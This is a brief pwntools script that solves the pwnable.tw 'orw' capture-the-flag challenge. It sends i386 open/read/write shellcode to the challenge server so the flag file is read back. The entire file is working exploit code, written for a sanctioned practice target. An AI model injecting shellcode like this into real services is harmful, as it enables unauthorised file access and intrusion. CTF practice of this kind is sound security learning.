from pwn import *

def pwn():
    r  =  remote("chall.pwnable.tw", 10001)
    sc =  shellcraft.i386.linux.open("/home/orw/flag")
    sc += shellcraft.i386.linux.read("eax", "esp", 39)
    sc += shellcraft.i386.linux.write(1, "esp", 39)
    r.send(asm(sc))
    r.interactive()

pwn()
